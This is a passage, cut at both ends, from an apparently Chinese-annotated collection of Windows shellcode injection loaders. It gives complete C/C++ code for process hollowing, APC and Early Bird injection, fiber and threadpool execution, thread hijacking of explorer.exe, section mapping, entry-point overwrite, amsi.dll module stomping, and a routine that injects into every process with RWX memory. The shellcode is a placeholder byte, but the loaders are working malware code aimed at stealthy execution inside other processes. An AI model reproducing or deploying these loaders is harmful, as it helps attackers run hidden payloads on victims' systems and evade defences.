destinationImageBaseAddress DWORD deltaImageBase = (DWORD)destImageBase - sourceImageNTHeaders->OptionalHeader.ImageBase; // set sourceImageBase to destImageBase and copy the source Image headers to the destination image sourceImageNTHeaders->OptionalHeader.ImageBase = (DWORD)destImageBase; WriteProcessMemory(destProcess, newDestImageBase, sourceFileBytesBuffer, sourceImageNTHeaders->OptionalHeader.SizeOfHeaders, NULL); // get pointer to first source image section PIMAGE_SECTION_HEADER sourceImageSection = (PIMAGE_SECTION_HEADER)((DWORD)sourceFileBytesBuffer + sourceImageDosHeaders->e_lfanew + sizeof(IMAGE_NT_HEADERS32)); PIMAGE_SECTION_HEADER sourceImageSectionOld = sourceImageSection; int err = GetLastError(); // copy source image sections to destination for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++) { PVOID destinationSectionLocation = (PVOID)((DWORD)destImageBase + sourceImageSection->VirtualAddress); PVOID sourceSectionLocation = (PVOID)((DWORD)sourceFileBytesBuffer + sourceImageSection->PointerToRawData); WriteProcessMemory(destProcess, destinationSectionLocation, sourceSectionLocation, sourceImageSection->SizeOfRawData, NULL); sourceImageSection++; } // get address of the relocation table IMAGE_DATA_DIRECTORY relocationTable = sourceImageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]; // patch the binary with relocations sourceImageSection = sourceImageSectionOld; for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++) { BYTE* relocSectionName = (BYTE*)\".reloc\"; if (memcmp(sourceImageSection->Name, relocSectionName, 5) != 0) { sourceImageSection++; continue; } DWORD sourceRelocationTableRaw = sourceImageSection->PointerToRawData; DWORD relocationOffset = 0; while (relocationOffset < relocationTable.Size) { PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)((DWORD)sourceFileBytesBuffer + sourceRelocationTableRaw + relocationOffset); relocationOffset += sizeof(BASE_RELOCATION_BLOCK); DWORD relocationEntryCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY); PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)((DWORD)sourceFileBytesBuffer + sourceRelocationTableRaw + relocationOffset); for (DWORD y = 0; y < relocationEntryCount; y++) { relocationOffset += sizeof(BASE_RELOCATION_ENTRY); if (relocationEntries[y].Type == 0) { continue; } DWORD patchAddress = relocationBlock->PageAddress + relocationEntries[y].Offset; DWORD patchedBuffer = 0; ReadProcessMemory(destProcess, (LPCVOID)((DWORD)destImageBase + patchAddress), &patchedBuffer, sizeof(DWORD), &bytesRead); patchedBuffer += deltaImageBase; WriteProcessMemory(destProcess, (PVOID)((DWORD)destImageBase + patchAddress), &patchedBuffer, sizeof(DWORD), fileBytesRead); int a = GetLastError(); } } } // get context of the dest process thread LPCONTEXT context = new CONTEXT(); context->ContextFlags = CONTEXT_INTEGER; GetThreadContext(pi->hThread, context); // update dest image entry point to the new entry point of the source image and resume dest image thread DWORD patchedEntryPoint = (DWORD)destImageBase + sourceImageNTHeaders->OptionalHeader.AddressOfEntryPoint; context->Eax = patchedEntryPoint; SetThreadContext(pi->hThread, context); ResumeThread(pi->hThread); return 0; } APC\u961f\u5217\u6ce8\u5165 \u961f\u5217\u4f1a\u5b9a\u671f\u679a\u4e3e\uff0c\u5b9a\u671f\u8c03\u7528shellcode #pragma comment(linker, \"/subsystem:\\\"windows\\\" /entry:\\\"mainCRTStartup\\\"\") #include <iostream> #include <Windows.h> #include <TlHelp32.h> #include <vector> int main() { unsigned char buf[] = \"\\xff\"; HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0); HANDLE victimProcess = NULL; PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) }; THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) }; std::vector<DWORD> threadIds; SIZE_T shellSize = sizeof(buf); HANDLE threadHandle = NULL; if (Process32First(snapshot, &processEntry)) { while (_wcsicmp(processEntry.szExeFile, L\"explorer.exe\") != 0) { Process32Next(snapshot, &processEntry); } } victimProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID); LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE); PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress; WriteProcessMemory(victimProcess, shellAddress, buf, shellSize, NULL); if (Thread32First(snapshot, &threadEntry)) { do { if (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID) { threadIds.push_back(threadEntry.th32ThreadID); } } while (Thread32Next(snapshot, &threadEntry)); } for (DWORD threadId : threadIds) { threadHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, threadId); QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL); Sleep(1000 * 2); } return 0; } Early Bird APC\u6ce8\u5165 \u7531\u4e8e\u662f\u65b0\u8d77\u4e86\u4e00\u4e2a\u8fdb\u7a0b\uff0c\u5c06\u6076\u610fAPC\u5bf9\u8c61\u52a0\u5230\u8fdb\u7a0b\u7684\u7ebf\u7a0b\u4e2d\uff0c\u6240\u4ee5\u4f1a\u4ee5\u542f\u52a8\u8fdb\u7a0b\u7684\u8eab\u4efd\u542f\u52a8\u6076\u610f\u4ee3\u7801 \u672c\u4f8b\u4e2d\u7528\u5230\u7684\u51fd\u6570 QueueUserAPC \u5c06APC\u5bf9\u8c61\u6dfb\u52a0\u5230\u6307\u5b9a\u7ebf\u7a0b\u7684APC\u961f\u5217 ResumeThread \u5524\u9192\u7ebf\u7a0b #include <Windows.h> int main() { unsigned char buf[] = \"\\xff\"; SIZE_T shellSize = sizeof(buf); STARTUPINFOA si = { 0 }; PROCESS_INFORMATION pi = { 0 }; CreateProcessA(\"C:\\\\Windows\\\\System32\\\\notepad.exe\", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi); //\u8d77\u4e00\u4e2a\u6302\u8d77\u72b6\u6001\u7684notepad\u8fdb\u7a0b HANDLE victimProcess = pi.hProcess; //\u83b7\u53d6notepad\u8fdb\u7a0b\u7684\u8fdb\u7a0b\u53e5\u67c4 HANDLE threadHandle = pi.hThread; //\u83b7\u53d6notepad\u8fdb\u7a0b\u7684\u7ebf\u7a0b\u53e5\u67c4 LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE); //\u5728notepad\u8fdb\u7a0b\u4e2d\u5206\u914d\u4e00\u4e2a\u865a\u62df\u5185\u5b58 PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress; // \u4e3a\u6307\u5b9a\u7684\u865a\u62df\u5185\u5b58\u5757\u5206\u914d\u4e00\u4e2aAPC\u5bf9\u8c61\u7c7b\u578b WriteProcessMemory(victimProcess, shellAddress, buf, shellSize, NULL); // \u5f80\u865a\u62df\u5185\u5b58\u5199\u5165shellcode QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL); // \u5c06\u5305\u542bshellcode\u7684APC\u5bf9\u8c61\u5206\u914d\u7ed9notepad\u7684\u7ebf\u7a0b ResumeThread(threadHandle); //\u5524\u9192\u7ebf\u7a0b\uff0c\u5c06\u542f\u52a8APC\u961f\u5217\u6267\u884cshellcode return 0; } \u901a\u8fc7 QueueUserAPC\u548cNtTestAlert\u6ce8\u5165 #pragma comment(linker, \"/subsystem:\\\"windows\\\" /entry:\\\"mainCRTStartup\\\"\") #include <Windows.h> #pragma comment(lib, \"ntdll\") using myNtTestAlert = NTSTATUS(NTAPI*)(); int main() { unsigned char buf[] = \"\\xfc\"; myNtTestAlert testAlert = (myNtTestAlert)(GetProcAddress(GetModuleHandleA(\"ntdll\"), \"NtTestAlert\")); SIZE_T shellSize = sizeof(buf); LPVOID shellAddress = VirtualAlloc(NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE); WriteProcessMemory(GetCurrentProcess(), shellAddress, buf, shellSize, NULL); PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress; QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), NULL); testAlert(); return 0; } \u4eceFibers \uff08\u7ea4\u7a0b\uff09\u8f7d\u5165shellcode \u7528\u4e00\u4e2a\u7ea4\u7a0b\u542f\u52a8\u53e6\u4e00\u4e2a\u6076\u610f\u7ea4\u7a0b \u7ea4\u7a0b\u662f\u6bd4\u7ebf\u7a0b\u66f4\u5c0f\u4e00\u7ea7\u7684\u5355\u4f4d \u672c\u4f8b\u4e2d\u7528\u5230\u7684\u51fd\u6570 ConvertThreadToFiber \u5f53\u524d\u4e3b\u7ebf\u7a0b\u8f6c\u6362\u4e3a\u7ea4\u7a0b CreateFiber \u521b\u5efa\u7ea4\u7a0b\uff0c\u521b\u5efa\u7684\u7ea4\u7a0b\u4e0d\u4f1a\u542f\u52a8 SwitchToFiber \u8c03\u7528\u7ea4\u7a0b\u4ee5\u4fbf\u542f\u52a8 #include <Windows.h> int main() { //convert main thread to fiber PVOID mainFiber = ConvertThreadToFiber(NULL); unsigned char shellcode[] = \"\\xfc\"; PVOID shellcodeLocation = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE); //\u5206\u914d\u865a\u62df\u5185\u5b58 memcpy(shellcodeLocation, shellcode, sizeof shellcode); //shellcode\u590d\u5236\u5230\u865a\u62df\u5185\u5b58 // create a fiber that will execute the shellcode PVOID shellcodeFiber = CreateFiber(NULL, (LPFIBER_START_ROUTINE)shellcodeLocation, NULL); // manually schedule the fiber that will execute our shellcode SwitchToFiber(shellcodeFiber); return 0; } \u901a\u8fc7\u7b49\u5f85\u5bf9\u8c61\u56de\u8c03\u51fd\u6570\u8f7d\u5165shellcode \u8bbe\u7f6e\u4e00\u4e2a\u5bf9\u8c61\uff0c\u8bbe\u7f6e\u4e00\u4e2a\u7b49\u5f85\u5bf9\u8c61\u7684\u56de\u8c03\u51fd\u6570(\u542bshellcode)\uff0c\u5c06\u5bf9\u8c61\u8bbe\u7f6e\u4e00\u76f4\u7b49\u5f85\uff0c\u6267\u884c\u56de\u8c03\u51fd\u6570(shellcode) \u672c\u4f8b\u4e2d\u7528\u5230\u7684\u51fd\u6570 CreateEvent \u521b\u5efa\u4e00\u4e2a\u4e8b\u4ef6\u5bf9\u8c61\uff0c\u8fd4\u56de\u4e8b\u4ef6\u53e5\u67c4 RtlMoveMemory \u590d\u5236\u5185\u5b58\u5757\uff0c\u76ee\u6807\uff0c\u6e90 CreateThreadpoolWait \u521b\u5efa\u7b49\u5f85\u5bf9\u8c61 SetThreadpoolWait \u8bbe\u7f6e\u7b49\u5f85\u5bf9\u8c61 WaitForSingleObject \u68c0\u67e5\u5f53\u524d\u72b6\u6001 #include <windows.h> #include <threadpoolapiset.h> unsigned char shellcode[] = \"\\xfc\"; int main() { HANDLE event = CreateEvent(NULL, FALSE, TRUE, NULL); LPVOID shellcodeAddress = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE); RtlMoveMemory(shellcodeAddress, shellcode, sizeof(shellcode)); PTP_WAIT threadPoolWait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)shellcodeAddress, NULL, NULL); SetThreadpoolWait(threadPoolWait, event, NULL); WaitForSingleObject(event, INFINITE); return 0; } \u4ecetext\u8868\u8f7d\u5165shellcode #pragma section(\".text\") __declspec(allocate(\".text\")) char goodcode[] = \"\\xfc; int main() { (*(void(*)())(&goodcode))(); } \u8fdc\u7a0b\u7ebf\u7a0b\u52ab\u6301 \u6307\u5b9a\u8fdc\u7a0b\u8fdb\u7a0b\uff0c\u679a\u4e3e\u8fdb\u7a0b\u7684\u7ebf\u7a0b\u5e76\u52ab\u6301\u3002 \u88ab\u52ab\u6301\u7684\u8fdb\u7a0b\u4f1a\u5361\u6b7b\u3002 \u53ef\u679a\u4e3e\u5f53\u524d\u8fdb\u7a0b\u6307\u5b9a\u4e00\u4e2a\u8fdb\u7a0b\u540d\uff0c\u6216\u65b0\u8d77\u4e00\u4e2a\u8fdb\u7a0b\u3002 \u679a\u4e3e\u6307\u5b9a\u8fdb\u7a0b\u540d\u4ee5\u4fbf\u6ce8\u5165 #include <iostream> #include <Windows.h> #include <TlHelp32.h> #include <stdio.h> DWORD GetProcessIdByName(const wchar_t* processName) { DWORD pid = 0; HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (snapshot != INVALID_HANDLE_VALUE) { PROCESSENTRY32W processEntry; processEntry.dwSize = sizeof(PROCESSENTRY32W); if (Process32FirstW(snapshot, &processEntry)) { do { if (_wcsicmp(processEntry.szExeFile, processName) == 0) { pid = processEntry.th32ProcessID; break; } } while (Process32NextW(snapshot, &processEntry)); } CloseHandle(snapshot); } return pid; } //\u679a\u4e3e\u8fdb\u7a0b\u540d\u83b7\u53d6PID int main() { unsigned char shellcode[] = \"\\xfc\"; HANDLE targetProcessHandle; PVOID remoteBuffer; HANDLE threadHijacked = NULL; HANDLE snapshot; THREADENTRY32 threadEntry; CONTEXT context; const wchar_t* processName = L\"explorer.exe\"; DWORD targetPID = GetProcessIdByName(processName); //\u5f97\u5230PID //DWORD targetPID = 5440; context.ContextFlags = CONTEXT_FULL; threadEntry.dwSize = sizeof(THREADENTRY32); targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID); remoteBuffer = VirtualAllocEx(targetProcessHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE); WriteProcessMemory(targetProcessHandle, remoteBuffer, shellcode, sizeof shellcode, NULL); snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); Thread32First(snapshot, &threadEntry); while (Thread32Next(snapshot, &threadEntry)) { if (threadEntry.th32OwnerProcessID == targetPID) { threadHijacked = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID); break; } } SuspendThread(threadHijacked); GetThreadContext(threadHijacked, &context); context.Rip = (DWORD_PTR)remoteBuffer; SetThreadContext(threadHijacked, &context); ResumeThread(threadHijacked); } \u521b\u5efa\u4e00\u4e2a\u540e\u53f0\u8fdb\u7a0b\u6ce8\u5165 #pragma comment(linker, \"/subsystem:\\\"windows\\\" /entry:\\\"mainCRTStartup\\\"\") #include <iostream> #include <Windows.h> #include <TlHelp32.h> #include <stdio.h> int main() { unsigned char shellcode[] = \"\\xfc\"; HANDLE targetProcessHandle; PVOID remoteBuffer; HANDLE threadHijacked = NULL; HANDLE snapshot; THREADENTRY32 threadEntry; CONTEXT context; //const wchar_t* processName = L\"notepad.exe\"; //DWORD targetPID = GetProcessIdByName(processName); char commandLine[] = \"C:\\\\Windows\\\\System32\\\\notepad.exe\"; STARTUPINFOA si = { 0 }; PROCESS_INFORMATION pi = { 0 }; CreateProcessA(NULL, commandLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi); DWORD targetPID = pi.dwProcessId; HWND hWnd = FindWindow(NULL, NULL); while (hWnd != NULL) { DWORD processID; GetWindowThreadProcessId(hWnd, &processID); if (processID == targetPID) { break; } hWnd = FindWindowEx(NULL, hWnd, NULL, NULL); } ShowWindow(hWnd, SW_HIDE); Sleep(10); //DWORD targetPID = 988; context.ContextFlags = CONTEXT_FULL; threadEntry.dwSize = sizeof(THREADENTRY32); targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID); remoteBuffer = VirtualAllocEx(targetProcessHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE); WriteProcessMemory(targetProcessHandle, remoteBuffer, shellcode, sizeof shellcode, NULL); snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); Thread32First(snapshot, &threadEntry); while (Thread32Next(snapshot, &threadEntry)) { if (threadEntry.th32OwnerProcessID == targetPID) { threadHijacked = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID); break; } } SuspendThread(threadHijacked); GetThreadContext(threadHijacked, &context); context.Rip = (DWORD_PTR)remoteBuffer; SetThreadContext(threadHijacked, &context); ResumeThread(threadHijacked); } SetWindowHookEx\u6ce8\u5165 #include \"pch.h\" #include <iostream> #include <Windows.h> int main() { HMODULE library = LoadLibraryA(\"dllhook.dll\"); HOOKPROC hookProc = (HOOKPROC)GetProcAddress(library, \"spotlessExport\"); HHOOK hook = SetWindowsHookEx(WH_KEYBOARD, hookProc, library, 0); Sleep(10*1000); UnhookWindowsHookEx(hook); return 0; } #include \"stdafx.h\" BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } extern \"C\" __declspec(dllexport) int spotlessExport() { unsigned char shellcode[] = \"\\xfc\"; void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(exec, shellcode, sizeof shellcode); ((void(*)())exec)(); return 0; } NtCreateSection + NtMapViewOfSection\u6ce8\u5165 \u5b9e\u73b0\u6d41\u7a0b\uff1a \u4f7f\u7528NtCreateSection\u521b\u5efa\u4e00\u4e2a\u5728\u8fdb\u7a0b\u4e2d\u5171\u4eab\u7684\u5185\u5b58\u5757 \u4f7f\u7528ZwMapViewOfSection\u5c06\u5728\u5185\u5b58\u4e2d\u7684\u67d0\u8282\u6620\u5c04\u5230\u6307\u5b9a\u8fdb\u7a0b\u4e2d \u5728\u8fdc\u7a0b\u8fdb\u7a0b\u4e2d\u521b\u5efa\u4e00\u4e2a\u7ebf\u7a0b\uff0c\u5c06\u8fd9\u6bb5\u5185\u5b58\u89c6\u56fe\u6620\u5c04\u5230\u7ebf\u7a0b\u4e2d\uff0c\u5185\u5b58\u89c6\u56fe\u4fdd\u5b58\u4e86shellcode\uff0c\u4ee5\u4fbf\u8fdc\u7a0b\u8fdb\u7a0b\u6267\u884cshellcode #include <iostream> #include <Windows.h> #include <TlHelp32.h> #include <stdio.h> #pragma comment(lib, \"ntdll\") typedef struct _LSA_UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } UNICODE_STRING, * PUNICODE_STRING; typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES; typedef struct _CLIENT_ID { PVOID UniqueProcess; PVOID UniqueThread; } CLIENT_ID, * PCLIENT_ID; using myNtCreateSection = NTSTATUS(NTAPI*)(OUT PHANDLE SectionHandle, IN ULONG DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN PLARGE_INTEGER MaximumSize OPTIONAL, IN ULONG PageAttributess, IN ULONG SectionAttributes, IN HANDLE FileHandle OPTIONAL); using myNtMapViewOfSection = NTSTATUS(NTAPI*)(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect); using myRtlCreateUserThread = NTSTATUS(NTAPI*)(IN HANDLE ProcessHandle, IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL, IN BOOLEAN CreateSuspended, IN ULONG StackZeroBits, IN OUT PULONG StackReserved, IN OUT PULONG StackCommit, IN PVOID StartAddress, IN PVOID StartParameter OPTIONAL, OUT PHANDLE ThreadHandle, OUT PCLIENT_ID ClientID); DWORD GetProcessIdByName(const wchar_t* processName) { DWORD pid = 0; HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (snapshot != INVALID_HANDLE_VALUE) { PROCESSENTRY32W processEntry; processEntry.dwSize = sizeof(PROCESSENTRY32W); if (Process32FirstW(snapshot, &processEntry)) { do { if (_wcsicmp(processEntry.szExeFile, processName) == 0) { pid = processEntry.th32ProcessID; break; } } while (Process32NextW(snapshot, &processEntry)); } CloseHandle(snapshot); } return pid; } int main() { unsigned char buf[] = \"\\xfc\"; myNtCreateSection fNtCreateSection = (myNtCreateSection)(GetProcAddress(GetModuleHandleA(\"ntdll\"), \"NtCreateSection\")); myNtMapViewOfSection fNtMapViewOfSection = (myNtMapViewOfSection)(GetProcAddress(GetModuleHandleA(\"ntdll\"), \"NtMapViewOfSection\")); myRtlCreateUserThread fRtlCreateUserThread = (myRtlCreateUserThread)(GetProcAddress(GetModuleHandleA(\"ntdll\"), \"RtlCreateUserThread\")); SIZE_T size = 4096; LARGE_INTEGER sectionSize = { size }; HANDLE sectionHandle = NULL; PVOID localSectionAddress = NULL, remoteSectionAddress = NULL; const wchar_t* processName = L\"explorer.exe\"; DWORD targetPID = GetProcessIdByName(processName); // create a memory section fNtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL); // create a view of the memory section in the local process fNtMapViewOfSection(sectionHandle, GetCurrentProcess(), &localSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE); // create a view of the memory section in the target process HANDLE targetHandle = OpenProcess(PROCESS_ALL_ACCESS, false, targetPID); fNtMapViewOfSection(sectionHandle, targetHandle, &remoteSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READ); // copy shellcode to the local view, which will get reflected in the target process's mapped view memcpy(localSectionAddress, buf, sizeof(buf)); HANDLE targetThreadHandle = NULL; fRtlCreateUserThread(targetHandle, NULL, FALSE, 0, 0, 0, remoteSectionAddress, NULL, &targetThreadHandle, NULL); return 0; } AddressOfEntryPoint Code Injection without VirtualAllocEx RWX \u672a\u6d4b\u8bd5\u6210\u529f #include <iostream> #include <windows.h> #include <winternl.h> #pragma comment(lib, \"ntdll\") int main() { unsigned char shellcode[] = \"\\xfc\"; STARTUPINFOA si; si = {}; PROCESS_INFORMATION pi = {}; PROCESS_BASIC_INFORMATION pbi = {}; DWORD returnLength = 0; CreateProcessA(0, (LPSTR)\"c:\\\\windows\\\\system32\\\\notepad.exe\", 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi); // get target image PEB address and pointer to image base NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLength); DWORD pebOffset = (DWORD)pbi.PebBaseAddress + 8; // get target process image base address LPVOID imageBase = 0; ReadProcessMemory(pi.hProcess, (LPCVOID)pebOffset, &imageBase, 4, NULL); // read target process image headers BYTE headersBuffer[4096] = {}; ReadProcessMemory(pi.hProcess, (LPCVOID)imageBase, headersBuffer, 4096, NULL); // get AddressOfEntryPoint PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)headersBuffer; PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)headersBuffer + dosHeader->e_lfanew); LPVOID codeEntry = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD)imageBase); // write shellcode to image entry point and execute it WriteProcessMemory(pi.hProcess, codeEntry, shellcode, sizeof(shellcode), NULL); ResumeThread(pi.hThread); return 0; } ModuleStomping \u6d41\u7a0b\uff1a 1.\u8d77\u4e00\u4e2a\u8fdb\u7a0b\uff0c\u83b7\u53d6\u53e5\u67c4 2.\u5206\u914d\u865a\u62df\u5185\u5b58\uff0c\u5c06\u6b63\u5e38dll\u6ce8\u5165\u5230\u8fdb\u7a0b\u4e2d 3.\u5728dll\u4e2d\u8d77\u4e00\u4e2a\u65b0\u7ebf\u7a0b\uff0c\u5c06shellcode\u6ce8\u5165\u5230\u65b0\u7ebf\u7a0b\u4e2d #include <iostream> #include <Windows.h> #include <psapi.h> int main(int argc, char* argv[]) { PVOID remoteBuffer; wchar_t moduleToInject[] = L\"C:\\\\windows\\\\system32\\\\amsi.dll\"; HMODULE modules[256] = {}; SIZE_T modulesSize = sizeof(modules); DWORD modulesSizeNeeded = 0; DWORD moduleNameSize = 0; SIZE_T modulesCount = 0; CHAR remoteModuleName[128] = {}; HMODULE remoteModule = NULL; unsigned char shellcode[] = \"\\xfc\"; // inject a benign DLL into remote process //HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1]))); //processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 8444); // \u521b\u5efa\u8fdb\u7a0b\u7684\u53c2\u6570 STARTUPINFOA si; PROCESS_INFORMATION pi; //// \u521d\u59cb\u5316STARTUPINFOA\u7ed3\u6784 ZeroMemory(&si, sizeof(STARTUPINFOA)); si.cb = sizeof(STARTUPINFOA); si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE; // \u8bbe\u7f6e\u7a97\u53e3\u4e0d\u53ef\u89c1 CreateProcessA(NULL, (LPSTR)\"C:\\\\Windows\\\\System32\\\\notepad.exe\", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi); //\u8d77\u4e00\u4e2a\u6302\u8d77\u72b6\u6001\u7684notepad\u8fdb\u7a0b HANDLE processHandle = pi.hProcess; //\u83b7\u53d6notepad\u8fdb\u7a0b\u7684\u8fdb\u7a0b\u53e5\u67c4 HANDLE threadHandle = pi.hThread; //\u83b7\u53d6notepad\u8fdb\u7a0b\u7684\u7ebf\u7a0b\u53e5\u67c4 remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof moduleToInject, MEM_COMMIT, PAGE_READWRITE); WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)moduleToInject, sizeof moduleToInject, NULL); PTHREAD_START_ROUTINE threadRoutine = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT(\"Kernel32\")), \"LoadLibraryW\"); HANDLE dllThread = CreateRemoteThread(processHandle, NULL, 0, threadRoutine, remoteBuffer, 0, NULL); WaitForSingleObject(dllThread, 1000); // find base address of the injected benign DLL in remote process EnumProcessModules(processHandle, modules, modulesSize, &modulesSizeNeeded); modulesCount = modulesSizeNeeded / sizeof(HMODULE); for (size_t i = 0; i < modulesCount; i++) { remoteModule = modules[i]; GetModuleBaseNameA(processHandle, remoteModule, remoteModuleName, sizeof(remoteModuleName)); if (std::string(remoteModuleName).compare(\"amsi.dll\") == 0) { std::cout << remoteModuleName << \" at \" << modules[i]; break; } } // get DLL's AddressOfEntryPoint DWORD headerBufferSize = 0x1000; LPVOID targetProcessHeaderBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, headerBufferSize); ReadProcessMemory(processHandle, remoteModule, targetProcessHeaderBuffer, headerBufferSize, NULL); PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)targetProcessHeaderBuffer; PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)targetProcessHeaderBuffer + dosHeader->e_lfanew); LPVOID dllEntryPoint = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)remoteModule); std::cout << \", entryPoint at \" << dllEntryPoint; // write shellcode to DLL's AddressofEntryPoint WriteProcessMemory(processHandle, dllEntryPoint, (LPCVOID)shellcode, sizeof(shellcode), NULL); // execute shellcode from inside the benign DLL CreateRemoteThread(processHandle, NULL, 0, (PTHREAD_START_ROUTINE)dllEntryPoint, NULL, 0, NULL); return 0; } Enumerating RWX Protected Memory \u679a\u4e3e\u5f53\u524d\u8fdb\u7a0b\u7684RWX\u5185\u5b58\u5e76\u8fdc\u7a0b\u6ce8\u5165\uff0c\u4f1a\u628a\u6bcf\u4e2a\u8fdb\u7a0b\u90fd\u5c1d\u8bd5\u53bb\u6ce8\u4e00\u904d\u3002 \u50cf\u75c5\u6bd2\u4e00\u6837\u3002 #include <iostream> #include <Windows.h> #include <TlHelp32.h> int main() { MEMORY_BASIC_INFORMATION mbi = {}; LPVOID offset = 0; HANDLE process = NULL; HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); PROCESSENTRY32 processEntry = {}; processEntry.dwSize = sizeof(PROCESSENTRY32); DWORD bytesWritten = 0; unsigned char shellcode[] = \"\\xff\"; Process32First(snapshot, &processEntry); while (Process32Next(snapshot, &processEntry)) { process = OpenProcess(MAXIMUM_ALLOWED, false, processEntry.th32ProcessID); if (process) { std::wcout << processEntry.szExeFile << \"\\n\"; while (VirtualQueryEx(process, offset, &mbi, sizeof(mbi))) { offset = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize); if (mbi.AllocationProtect == PAGE_EXECUTE_READWRITE && mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE) { std::cout << \"\\tRWX: 0x\" << std::hex << mbi.BaseAddress << \"\\n\"; WriteProcessMemory(process, mbi.BaseAddress, shellcode, sizeof(shellcode), NULL); CreateRemoteThread(process, NULL, NULL, (LPTHREAD_START_ROUTINE)mbi.BaseAddress, NULL, NULL, NULL); } } offset = 0; } CloseHandle(process); } return 0; } FunctionStomping \u4e0eModuleStomping\u7c7b\u4f3c\uff0c\u4f46\u53c8\u6709\u4e0d\u540c\u3002 1.\u83b7\u53d6\u4e00\u4e2a\u8fdc\u7a0b\u8fdb\u7a0b\u7684\u53e5\u67c4 